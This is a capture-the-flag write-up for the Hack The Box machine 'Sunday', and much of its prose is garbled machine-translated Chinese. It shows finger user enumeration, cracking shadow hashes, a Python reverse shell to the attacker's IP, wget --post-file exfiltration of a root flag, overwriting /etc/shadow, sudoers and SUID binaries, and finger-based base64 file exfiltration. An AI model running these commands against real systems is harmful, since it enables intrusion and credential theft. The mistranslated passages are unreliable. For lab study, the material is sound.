# 高温透析系统：周日

[0xdf.gitlab.io](https://0xdf.gitlab.io/2018/09/29/htb-sunday.html)0xdf黑客的东西

星期天绝对是黑客盒子上更容易的盒子之一。它有很多有趣的概念，但在拥挤的服务器上，它们相互踩踏。我们首先使用手指暴力枚举用户，尽管一旦有人登录，答案就会给出给任何在该主机工作的人。我从来不是要求人们只是猜测明显密码的超级粉丝，但是在那之后，还有一些挑战，包括一个后来证明有用的巨魔，一些密码破解，以及大量使用wget完成最终特权的巧妙机会。我将展示6使用wget获取根的方法。最后，在 Beyond Root 中，我将探讨由 root、手指运行的覆盖脚本，用于文件传输，以及无需读取即可执行。

*   侦察
    *   n地图
    *   手指
        *   概述
        *   使用手指
        *   蛮 力
*   用户外壳 - SSH 阳光明媚
*   私密性：阳光灿烂
    *   查找备份影子
    *   打破与哈希猫
    *   用户外壳 - SSH 作为 sammy / 用户.txt
*   Privesc： sammy to root
    *   列举
    *   6 使用方法生根
        *   –输入文件
        *   邮政旗帜
        *   覆盖巨魔
        *   覆盖不同的 SUID 二进制文件
        *   覆盖阴影
        *   覆盖 sudoers
*   超越根
    *   改写
        *   这是什么
        *   它在做什么
    *   用于文件传输的手指
    *   代理商22
        *   发现
        *   权限问题
        *   这是什么

## 侦察

### n地图

nmap 显示四个打开的端口，包括非标准端口 （22022） 上的 ssh、手指和运行短信的 rpc。它还揭示了周日是索拉里斯的主持人。这个输出是从我最初解决星期天的时候开始的。在下一节中，我将讨论这将如何更改手指输出。

    root@kali:~/hackthebox/sunday-10.10.10.76# nmap -sT -p- --min-rate 5000 -oA nmap/alltcp 10.10.10.76
    Starting Nmap 7.70 ( https://nmap.org ) at 2018-05-03 11:08 EDT
    Warning: 10.10.10.76 giving up on port because retransmission cap hit (10).
    Nmap scan report for 10.10.10.76
    Host is up (0.096s latency).
    Not shown: 61176 filtered ports, 4355 closed ports
    PORT      STATE SERVICE
    79/tcp    open  finger
    111/tcp   open  rpcbind
    22022/tcp open  unknown
    65258/tcp open  unknown
    
    Nmap done: 1 IP address (1 host up) scanned in 140.89 seconds
    root@kali:~/hackthebox/sunday-10.10.10.76# nmap -sV -sC -p 79,111,22022,65258 -oA nmap/scripts 10.10.10.76
    Starting Nmap 7.70 ( https://nmap.org ) at 2018-05-03 11:11 EDT
    Nmap scan report for 10.10.10.76
    Host is up (0.096s latency).
    
    PORT      STATE SERVICE   VERSION
    79/tcp    open  finger    Sun Solaris fingerd
    | finger: Login       Name               TTY         Idle    When    Where\x0D
    | sunny    sunny                 pts/1            Thu 14:52  10.10.14.245        \x0D
    | sunny    sunny                 pts/2          4 Thu 13:55  10.10.15.182        \x0D
    | sunny    sunny                 pts/4          2 Thu 13:55  10.10.16.94         \x0D
    | sunny    sunny                 pts/5          8 Thu 14:52  10.10.15.42         \x0D
    | sunny    sunny                 pts/6         21 Thu 14:14  10.10.14.120        \x0D
    | sunny    sunny                 pts/7          2 Thu 14:32  10.10.15.138        \x0D
    | sunny    sunny                 pts/8         49 Thu 14:20  10.10.15.167        \x0D
    | sunny    sunny                 pts/9          9 Thu 14:28  10.10.14.122        \x0D
    | sammy    sammy                 pts/10           Thu 15:07  10.10.14.78         \x0D
    | sunny    sunny                 pts/11         1 Thu 15:06  10.10.16.73         \x0D
    | sammy    sammy                 pts/12         4 Thu 14:44  10.10.15.38         \x0D
    | sammy    sammy                 pts/13           Thu 15:10  10.10.15.182        \x0D
    |_sammy    sammy                 pts/14         1 Thu 15:06  10.10.15.213        \x0D
    111/tcp   open  rpcbind   2-4 (RPC #100000)
    22022/tcp open  ssh       SunSSH 1.3 (protocol 2.0)
    | ssh-hostkey:
    |   1024 d2:e5:cb:bd:33:c7:01:31:0b:3c:63:d9:82:d9:f1:4e (DSA)
    |_  1024 e4:2c:80:62:cf:15:17:79:ff:72:9d:df:8b:a6:c9:ac (RSA)
    65258/tcp open  smserverd 1 (RPC #100155)
    Service Info: OS: Solaris; CPE: cpe:/o:sun:sunos
    
    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 40.97 seconds
    

### finger

#### Overview

The [finger](https://en.wikipedia.org/wiki/Finger_protocol) daemon listens on port 79, and is really a relic of a time when computers were far too trusting and open. It provides status reports on logged in users. It can also provide details about a specific user and when they last logged in and from where.

#### Using finger

The finger nmap script returned a long list of logged in users, providing two user names, sunny and sammy. That said, if you look at this box on a non-crowded VIP server now, it’s certainly possible that there are no logged in users.

Running will tell us of any currently logged in users:`finger @[ip]`

    root@kali:~/hackthebox/sunday-10.10.10.76/finger-user-enum-1.0# finger @10.10.10.76
    No one logged on
    

This is the same command that the nmap script runs. So were that same scan run now, we would get an empty result (as opposed to seeing all the logins when I originally ran it).

finger can also check for details on a specific user. Try one that doesn’t exist:

    root@kali:~/hackthebox/sunday-10.10.10.76/finger-user-enum-1.0# finger 0xdf@10.10.10.76
    Login       Name               TTY         Idle    When    Where
    0xdf                  ???
    

If the user does exist, information will come back. I’ll show that below once we find a user name.

#### Brute Force

If finger returns no logged in users, we can try to brute force usernames. We’ll use the [finger-user-enum.pl](http://pentestmonkey.net/tools/finger-user-enum/finger-user-enum-1.0.tar.gz) script from pentestmonkey.

    root@kali:~/hackthebox/sunday-10.10.10.76/finger-user-enum-1.0# ./finger-user-enum.pl -U /opt/SecLists/Usernames/Names/names.txt -t 10.10.10.76
    Starting finger-user-enum v1.0 ( http://pentestmonkey.net/tools/finger-user-enum )
    
     ----------------------------------------------------------
    |                   Scan Information                       |
     ----------------------------------------------------------
    
    Worker Processes ......... 5
    Usernames file ........... /opt/SecLists/Usernames/Names/names.txt
    Target count ............. 1
    Username count ........... 10163
    Target TCP port .......... 79
    Query timeout ............ 5 secs
    Relay Server ............. Not used
    
    ######## Scan started at Thu Sep 27 17:39:02 2018 #########
    access@10.10.10.76: access No Access User                     < .  .  .  . >..nobody4  SunOS 4.x NFS Anonym               < .  .  .  . >..
    admin@10.10.10.76: Login       Name               TTY         Idle    When    Where..adm      Admin                              < .  .  .  . >..lp       Line Printer Admin                 < .  .  .  . >..uucp     uucp Admin                         < .  .  .  . >..nuucp    uucp Admin                         < .  .  .  . >..dladm    Datalink Admin                     < .  .  .  . >..listen   Network Admin                      < .  .  .  . >..
    anne marie@10.10.10.76: Login       Name               TTY         Idle    When    Where..anne                  ???..marie                 ???..
    bin@10.10.10.76: bin             ???                         < .  .  .  . >..
    dee dee@10.10.10.76: Login       Name               TTY         Idle    When    Where..dee                   ???..dee                   ???..
    jo ann@10.10.10.76: Login       Name               TTY         Idle    When    Where..jo                    ???..ann                   ???..
    la verne@10.10.10.76: Login       Name               TTY         Idle    When    Where..la                    ???..verne                 ???..
    line@10.10.10.76: Login       Name               TTY         Idle    When    Where..lp       Line Printer Admin                 < .  .  .  . >..
    message@10.10.10.76: Login       Name               TTY         Idle    When    Where..smmsp    SendMail Message Sub               < .  .  .  . >..
    miof mela@10.10.10.76: Login       Name               TTY         Idle    When    Where..miof                  ???..mela                  ???..
    sammy@10.10.10.76: sammy                 pts/2        <Sep 27 13:55> 10.10.16.26         ..
    sunny@10.10.10.76: sunny                 pts/3        <Apr 24 10:48> 10.10.14.4          ..
    sys@10.10.10.76: sys             ???                         < .  .  .  . >..
    zsa zsa@10.10.10.76: Login       Name               TTY         Idle    When    Where..zsa                   ???..zsa                   ???..
    ######## Scan completed at Thu Sep 27 17:44:39 2018 #########
    14 results.
    
    10163 queries in 337 seconds (30.2 queries / sec)
    

那里有一些垃圾，但有两个有趣的用户名：

    sammy@10.10.10.76: sammy                 pts/2        <Sep 27 13:55> 10.10.16.26         ..
    sunny@10.10.10.76: sunny                 pts/3        <Apr 24 10:48> 10.10.14.4          ..
    

现在，我们可以比较手指的结果，找到一个存在的名字和一个不存在的名字：

    root@kali:~/hackthebox/sunday-10.10.10.76# finger 0xdf@10.10.10.76
    Login       Name               TTY         Idle    When    Where
    0xdf                  ???
    root@kali:~/hackthebox/sunday-10.10.10.76# finger sunny@10.10.10.76
    Login       Name               TTY         Idle    When    Where
    sunny    sunny                 pts/2            Fri 11:06  10.10.14.5
    

## 用户外壳 - SSH 阳光明媚

使用两个已知帐户和ssh，值得猜测一些密码。我总是尝试管理员，根，框名称以及应用程序的任何默认值。事实证明，阳光明媚/周日有效：

    root@kali:~/hackthebox/sunday-10.10.10.76# ssh -p 22022 sunny@10.10.10.76
    Password:
    Last login: Thu May  3 15:25:35 2018 from 10.10.14.12
    Sun Microsystems Inc.   SunOS 5.11      snv_111b        November 2008
    sunny@sunday:~$ pwd
    /export/home/sunny
    sunny@sunday:~$ id
    uid=65535(sunny) gid=1(other) groups=1(other)
    

## 私密性：阳光灿烂

### 查找备份影子

里面有一个文件的副本，可以全域读取：`/backup``shadow`

    sunny@sunday:/backup$ ls -l
    total 2
    -r-x--x--x 1 root root  53 2018-04-24 10:35 agent22.backup
    -rw-r--r-- 1 root root 319 2018-04-15 20:44 shadow.backup
    
    sunny@sunday:/backup$ cat shadow.backup
    mysql:NP:::::::
    openldap:*LK*:::::::
    webservd:*LK*:::::::
    postgres:NP:::::::
    svctag:*LK*:6445::::::
    nobody:*LK*:6445::::::
    noaccess:*LK*:6445::::::
    nobody4:*LK*:6445::::::
    sammy:$5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB:6445::::::
    sunny:$5$iRMbpnBv$Zh7s6D7ColnogCdiVE5Flz9vCZOMkUFxklRhhaShxv3:17636::::::
    
    

### 打破与哈希猫

拉回影子.backup和 passwd 文件，并在使用取消阴影创建无阴影文件后，john 或 hashcat 可以中断这两个哈希值。以下是哈希卡输出的外观（清除状态消息）：

    $ hashcat -m 7400 sunday.hashes /usr/share/wordlists/rockyou.txt --force
    ...[snip]...
    $5$iRMbpnBv$Zh7s6D7ColnogCdiVE5Flz9vCZOMkUFxklRhhaShxv3:sunday
    $5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB:cooldude!
    ...[snip]...
    

### 用户外壳 - SSH 作为 sammy / 用户.txt

有了萨米的密码，现在可以以萨米的身份ssh进来：

    root@kali:~/hackthebox/sunday-10.10.10.76# ssh -p 22022 sammy@10.10.10.76
    Password:
    Last login: Sat May  5 20:06:34 2018 from 10.10.14.112
    Sun Microsystems Inc.   SunOS 5.11      snv_111b        November 2008
    sammy@sunday:~$
    

萨米有权访问用户.txt：

    sammy@sunday:~$ wc -c Desktop/user.txt
    33 Desktop/user.txt
    
    sammy@sunday:~$ cat Desktop/user.txt
    a3d94980...
    

## Privesc： sammy to root

### 列举

在枚举为 sammy 时，我看到 sammy 可以在没有密码的情况下进行验证（[无论是在 LinEnum.sh](https://github.com/rebootuser/LinEnum) 输出中还是在检查中）。`sudo -l`

### 6 使用方法生根

我们可以从这里做很多事情。阅读 [wget 手册页](https://linux.die.net/man/1/wget)提供了丰富的想法。我将展示六个示例。

#### –输入文件

获取标志的最简单方法是利用 wget 上的 或 标志。此标志允许您提供包含要访问的 URL 的文件。当它读取哈希时，字符串将无法作为URL处理，并将在错误消息中告诉我们，并带有标志：`--input-file``-i`

    sammy@sunday:~$ sudo wget --input-file /root/root.txt
    /root/root.txt: Invalid URL fb40fab6...: Unsupported scheme
    No URLs found in /root/root.txt.
    

#### 邮政旗帜

破坏标志的第二种方法是让 wget 使用 将文件发布回给我们。不幸的是，蟒蛇简单HTTP服务器不支持开机自检请求：`--post-file`

    root@kali:~/pwk/lab/public# python3 -m http.server 443
    Serving HTTP on 0.0.0.0 port 443 (http://0.0.0.0:443/) ...
    10.10.10.76 - - [27/Sep/2018 20:57:17] code 501, message Unsupported method ('POST')
    10.10.10.76 - - [27/Sep/2018 20:57:17] "POST / HTTP/1.0" 501 -
    

但是，在这种情况下，我只需要阅读POST，而不响应它，所以一个简单的将工作：`nc`

    sammy@sunday:~$ sudo wget --post-file /root/root.txt http://10.10.14.5:443/
    --00:52:35--  http://10.10.14.5:443/
               => `index.html'
    Connecting to 10.10.14.5:443... connected.
    HTTP request sent, awaiting response...
    

    root@kali:~/pwk/lab/public# nc -lnvp 443
    listening on [any] 443 ...
    connect to [10.10.14.5] from (UNKNOWN) [10.10.10.76] 49337
    POST / HTTP/1.0
    User-Agent: Wget/1.10.2
    Accept: */*
    Host: 10.10.14.5:443
    Connection: Keep-Alive
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 33
    
    fb40fab6...
    

#### Overwrite troll

Enough just getting the flag. I obviously want a root shell.

This was actually how I first solved the box. When enumerating as sunny, I found a binary named troll that sunny could run with sudo without password:

    sunny@sunday:~$ sudo -l
    User sunny may run the following commands on this host:
        (root) NOPASSWD: /root/troll
    
    sunny@sunday:~$ sudo /root/troll
    testing
    uid=0(root) gid=0(root)
    

There’s nothing we could do with this as sunny. However, I think the box author expects us to use this file to privesc (hence the overwrite script).

So let’s make troll useful. First, on kali, create a shell.py, which is basically a nicely formatted [reverse python shell from pentestmonkey](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet):

    #!/usr/bin/python
    
    import socket
    import subprocess
    import os
    
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(("10.10.14.5",443))
    os.dup2(s.fileno(),0)
    os.dup2(s.fileno(),1)
    os.dup2(s.fileno(),2)
    p=subprocess.call(["/bin/sh","-i"]);
    

Serve it with SimpleHTTPServer, and request with wget, using the option, which will allow us to specify a file to write the wget output to, and it will overwrite that file if it already exists:`shell.py``-O`

    sammy@sunday:~$ sudo wget http://10.10.14.5/shell.py -O /root/troll
    --01:07:04--  http://10.10.14.5/shell.py
               => `/root/troll'
    Connecting to 10.10.14.5:80... connected.
    HTTP request sent, awaiting response... 200 OK
    Length: 246 [text/plain]
    
    100%[==========================================================================================================================================================================================================>] 246           --.--K/s
    
    01:07:04 (25.59 MB/s) - `/root/troll' saved [246/246]
    

    root@kali:~/hackthebox/sunday-10.10.10.76# python3 -m http.server 80
    Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
    10.10.10.76 - - [27/Sep/2018 21:11:58] "GET /shell.py HTTP/1.0" 200 -
    

Run it with sunny:

    sunny@sunday:~$ sudo /root/troll
    

And get callback:

    root@kali:~/hackthebox/sunday-10.10.10.76# nc -lnvp 443
    listening on [any] 443 ...
    connect to [10.10.14.5] from (UNKNOWN) [10.10.10.76] 56164
    root@sunday:~# id
    uid=0(root) gid=0(root) groups=0(root),1(other),2(bin),3(sys),4(adm),5(uucp),6(mail),7(tty),8(lp),9(nuucp),12(daemon)
    

This is a bit trickier to pull off than it one might think at first, if you aren’t quick _and_ lucky. That’s because of the script resetting to it’s original self every 5 seconds. Check out the Beyond Root section where I’ll look at detecting this. But for the sake of making it work, have the windows close together and run as sammy immediately followed by as sunny.`overwrite``troll``wget``troll`

Here’s how I did it, with SimpleHTTPServer in the top window, then sammy SSH, then sunny SSH, and then nc listener to catch root shell:

![1538099855160](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fsunday-troll-priv.gif)

#### Overwrite Different SUID Binary

If catching troll before it reverts was too much, it’s certainly easier to just overwrite a different set uid binary. Just make a backup copy of the original first, so you can put it back after exploiting. For example, :`/usr/bin/passwd`

    sammy@sunday:~$ cp /usr/bin/passwd /tmp
    sammy@sunday:~$ ls -la /usr/bin/passwd
    -r-sr-sr-x 1 root sys 31584 2009-05-14 21:18 /usr/bin/passwd
    sammy@sunday:~$ sudo wget -O /usr/bin/passwd http://10.10.14.5/shell.py
    --02:09:34--  http://10.10.14.5/shell.py
               => `/usr/bin/passwd'
    Connecting to 10.10.14.5:80... connected.
    HTTP request sent, awaiting response... 200 OK
    Length: 246 [application/octet-stream]
    
    100%[==========================================================================================================================================================================================================>] 246           --.--K/s
    
    02:09:34 (69.91 KB/s) - `/usr/bin/passwd' saved [246/246]
    
    sammy@sunday:~$ passwd
    

    root@kali:~/pwk/lab/public# nc -lnvp 443
    listening on [any] 443 ...
    connect to [10.10.14.5] from (UNKNOWN) [10.10.10.76] 41346
    # id
    uid=101(sammy) gid=10(staff) euid=0(root) egid=3(sys) groups=10(staff)
    

#### Overwrite shadow

Overwriting and/or seemed to be the most common attempt to root this box, and it ended up with a lot of people screwing up the box and making it unusable. In fact, it led to people trying to do the finger enumeration in the initial stage and getting nothing back because the user list was jacked up.`/etc/passwd``/etc/shadow`

In general, there are just better ways to do this. That said, if you want to go this route, here’s one way how.

Since we already have the shadow backup file, we’ll use that. It doesn’t have a root entry at the top, but let’s add one:

    root:$5$iRMbpnBv$Zh7s6D7ColnogCdiVE5Flz9vCZOMkUFxklRhhaShxv3:17636::::::
    mysql:NP:::::::
    openldap:*LK*:::::::
    webservd:*LK*:::::::
    postgres:NP:::::::
    svctag:*LK*:6445::::::
    nobody:*LK*:6445::::::
    noaccess:*LK*:6445::::::
    nobody4:*LK*:6445::::::
    sammy:$5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB:6445::::::
    sunny:$5$iRMbpnBv$Zh7s6D7ColnogCdiVE5Flz9vCZOMkUFxklRhhaShxv3:17636::::::
    

In this case, I’ve made the root entry the same as sunny, other than the username.

Then get it with wget, and then su and give it password “sunday”:

    sammy@sunday:~$ sudo wget -O /etc/shadow http://10.10.14.5/shadow
    --02:00:10--  http://10.10.14.5/shadow
               => `/etc/shadow'
    Connecting to 10.10.14.5:80... connected.
    HTTP request sent, awaiting response... 200 OK
    Length: 392 [application/octet-stream]
    
    100%[==========================================================================================================================================================================================================>] 392           --.--K/s
    
    02:00:10 (42.45 MB/s) - `/etc/shadow' saved [392/392]
    
    sammy@sunday:~$ su -
    Password:
    Sun Microsystems Inc.   SunOS 5.11      snv_111b        November 2008
    You have new mail.
    root@sunday:~# id
    uid=0(root) gid=0(root) groups=0(root),1(other),2(bin),3(sys),4(adm),5(uucp),6(mail),7(tty),8(lp),9(nuucp),12(daemon)
    

If I had wanted to give root a different password, and not just copy from sunny or sammy, I could use openssl:

    root@kali:~/hackthebox/sunday-10.10.10.76# openssl passwd -1 -salt 0xdf password
    $1$0xdf$fKKvgEPPSu1HMdNI3w5i50
    

Then put that into shadow:

    root@kali:~/hackthebox/sunday-10.10.10.76# head -1 shadow
    root:$1$0xdf$fKKvgEPPSu1HMdNI3w5i50:17636::::::
    

And now I can with the password “password”.`su`

#### Overwrite sudoers

The file defines who can run sudo on which applications. We can estimate that, without comments, the unmodified file on Sunday looks something like:`/etc/sudoers`

    root  ALL=(ALL) ALL
    sammy ALL=(root) NOPASSWD: /usr/bin/wget
    sunny ALL=(root) NOPASSWD: /root/troll
    

Let’s change that slightly in a copy on our local host, giving sammy the ability to run without password:`su`

    root  ALL=(ALL) ALL
    sammy ALL=(root) NOPASSWD: /usr/bin/su
    sunny ALL=(root) NOPASSWD: /root/troll
    

Now, use wget to overwrite the file on Sunday, and then it is easy to get a root shell:

    sammy@sunday:~$ sudo wget -O /etc/sudoers http://10.10.14.5/sudoers
    --02:07:08--  http://10.10.14.5/sudoers
               => `/etc/sudoers'
    Connecting to 10.10.14.5:80... connected.
    HTTP request sent, awaiting response... 200 OK
    Length: 99 [application/octet-stream]
    
    100%[==========================================================================================================================================================================================================>] 99            --.--K/s
    
    02:07:08 (15.45 MB/s) - `/etc/sudoers' saved [99/99]
    
    sammy@sunday:~$ sudo -l
    User sammy may run the following commands on this host:
        (root) NOPASSWD: /usr/bin/su
    sammy@sunday:~$ sudo su
    root@sunday:~# id
    uid=0(root) gid=0(root)
    

## 超越根

### 改写

#### 这是什么

使用根外壳，我在根主目录中找到了脚本。`overwrite`

    root@sunday:/root# cat overwrite
    #!/usr/bin/bash
    
    while true; do
            /usr/gnu/bin/cat /root/troll.original > /root/troll
            /usr/gnu/bin/sleep 5
    done
    

这与巨魔定期设置回其默认状态以怀疑脚本在盒子上运行的体验是一致的。此外，它确实显示在进程列表中：

    sammy@sunday:/tmp$ ps awux | grep overwrite
    root       499  0.1  0.2 6204 2420 ?        S 01:41:01  0:09 /usr/bin/bash /root/overwrite
    

#### 它在做什么

没有root访问权限，我们怎么能弄清楚在做什么？`overwrite`

我试图为 solaris 编译 [pspy](https://github.com/DominicBreuker/pspy)，但无法让它工作。如果您知道如何操作，请发表评论。

因此，我回到了我在[ippsec视频](https://youtu.be/K9DKULxSBK4?t=31m30s)和[OSCP笔记](https://scund00r.com/all/oscp/2018/02/25/passing-oscp.html#scripts)中看到的bash进程监视器。我必须改变一些事情才能让它在 Solaris 上工作。我还减少了睡眠时间，并将 pid 输出添加到 ps 命令中，这样，如果相同的命令一遍又一遍地运行，我们仍然会看到这种变化：

    sammy@sunday:/tmp$ cat pm.sh
    #!/bin/bash
    
    # Loop by line
    IFS=$'\n'
    
    old_process=$(ps -eo args -o pid)
    
    while true; do
            new_process=$(ps -eo args -o pid)
            diff <(echo "$old_process") <(echo "$new_process") | grep [\<\>] | grep -v "ps -eo args"
            sleep .1
            old_process=$new_process
    done
    

运行此命令将显示每 5 秒运行一次新的运行，因为睡眠过程的 pid 会发生变化：`sleep 5`

    sammy@sunday:/tmp$ ./pm.sh
    < /usr/gnu/bin/sleep 5                                                             14430
    > /usr/gnu/bin/sleep 5                                                             14453
    < /usr/gnu/bin/sleep 5                                                             14453
    > /usr/gnu/bin/sleep 5                                                             14486
    < /usr/gnu/bin/sleep 5                                                             14486
    > /usr/gnu/bin/sleep 5                                                             14524
    < /usr/gnu/bin/sleep 5                                                             14524
    > /usr/gnu/bin/sleep 5                                                             14557
    < /usr/gnu/bin/sleep 5                                                             14557
    > /usr/gnu/bin/sleep 5                                                             14597
    

稍等片刻，我们偶尔会看到类似这样的东西：

    < /usr/gnu/bin/sleep 5                                                             15283
    > /usr/gnu/bin/sleep 5                                                             15319
    < /usr/gnu/bin/sleep 5                                                             15319
    > <defunct>                                                                        15355
    < <defunct>                                                                        15355
    > /usr/gnu/bin/sleep 5                                                             15357
    < /usr/gnu/bin/sleep 5                                                             15357
    > <defunct>                                                                        15393
    < <defunct>                                                                        15393
    > /usr/gnu/bin/sleep 5                                                             15394
    < /usr/gnu/bin/sleep 5                                                             15394
    > <defunct>                                                                        15429
    < <defunct>                                                                        15429
    > /usr/gnu/bin/sleep 5                                                             15431
    < /usr/gnu/bin/sleep 5                                                             15431
    > /usr/gnu/bin/sleep 5                                                             15467
    

如果脚本在计时方面很幸运，它将捕获从进程列表中删除并被添加的睡眠，然后在它返回睡眠后立即。该标记被分配给僵尸进程，其父进程尚未完全终止它们。在某些情况下，这些过程会徘徊不去。在这种情况下，这只是我们在进程完成后但在它完全退出之前捕获该过程。因为它已经终止，所以我们没有得到命令行。尽管如此，我们现在知道某些东西正在运行一个非常快的命令（或者可能是命令），然后休眠5秒钟。`<defunct>``<defunct>`

这是我能够实现的最好的，只要确定只有sammy访问就可以做什么。如果您有更好的想法，我很乐意在评论中听到它们。`overwrite`

### 用于文件传输的手指

在撰写这篇文章时，我正在查看[gfobins](https://gtfobins.github.io/)，他们的手指页面显示了如何将其用于文件传输。例如，要从星期日开始扩展密码文件，则侦听器在本地启动：

    root@sunday:~# finger "$(base64 /etc/passwd)"@10.10.14.5
    [10.10.14.5]
    

    root@kali:~/hackthebox/sunday-10.10.10.76# nc -lnvp 79 | base64 -d > passwd
    listening on [any] 79 ...
    connect to [10.10.14.5] from (UNKNOWN) [10.10.10.76] 54768
    
    root@kali:~/hackthebox/sunday-10.10.10.76# cat passwd
    root:x:0:0:Super-User:/root:/usr/bin/bash
    daemon:x:1:1::/:
    ...[snip]...
    

您也可以将文件上传到目标计算机：

    root@kali:~/hackthebox/sunday-10.10.10.76# cat shell.py | base64 | nc -lp 79
    

    root@sunday:~# finger x@10.10.14.5 > shell.b64
    

在这种情况下，生成的文件有一些IP信息，用换行符分隔，但我们可以清理它：

    root@sunday:~# cat  shell.b64
    [10.10.14.5]
    IyEvdXNyL2Jpbi9weXRob24KCmltcG9ydCBzb2NrZXQKaW1wb3J0IHN1YnByb2Nlc3MKaW1wb3J0IG9zCgpzPXNvY2tldC5zb2NrZXQoc29ja2V0LkFGX0lORVQsc29ja2V0LlNPQ0tfU1RSRUFNKQpzLmNvbm
    5lY3QoKCIxMC4xMC4xNC41Iiw0NDMpKQpvcy5kdXAyKHMuZmlsZW5vKCksMCkKb3MuZHVwMihzLmZpbGVubygpLDEpCm9zLmR1cDIocy5maWxlbm8oKSwyKQpwPXN1YnByb2Nlc3MuY2FsbChbIi9iaW4vc2gi
    LCItaSJdKTsK
    
    root@sunday:~# cat  shell.b64 | head -2 | tail -1 | base64 -d
    #!/usr/bin/python
    
    import socket
    import subprocess
    import os
    
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(("10.10.14.5",443))
    os.dup2(s.fileno(),0)
    os.dup2(s.fileno(),1)
    os.dup2(s.fileno(),2)
    p=subprocess.call(["/bin/sh","-i"]);
    

### agent22

#### Discovery

When on as sunny, I noticed a second file in the directory next to the shadow backup:`/backup`

    sunny@sunday:/backup$ ls -l
    total 2
    -r-x--x--x 1 root root  53 2018-04-24 10:35 agent22.backup
    -rw-r--r-- 1 root root 319 2018-04-15 20:44 shadow.backup
    

And while we don’t have permission to read the file, we can try to run it:

    sunny@sunday:/backup$ ./agent22.backup
    /usr/bin/bash: ./agent22.backup: Permission denied
    

#### Permissions Issues

那么，为什么权限被拒绝呢？它归结为运行时发生的情况。如果该程序是二进制文件（即精灵），则内核首先检查当前用户是否具有执行该文件的权限，然后内核读取该文件并由内核加载到内存中。`./program`

但是，对于解释型脚本（python、perl、bash、sh 等），内核以当前用户的身份加载解释器，然后该解释器尝试读取文件内容并运行它们。但是，在这种情况下，由于解释器以晴天身份运行，对文件没有读取权限，因此被拒绝。

#### 这是什么

使用根外壳，我们发现这实际上只是巨魔的备份副本：

    root@sunday:/backup# cat agent22.backup
    #!/usr/bin/bash
    
    /usr/bin/echo "testing"
    /usr/bin/id
    

    root@sunday:/# diff -s /root/troll /backup/agent22.backup
    Files /root/troll and /backup/agent22.backup are identical
    

[查看原网页: 0xdf.gitlab.io](https://0xdf.gitlab.io/2018/09/29/htb-sunday.html)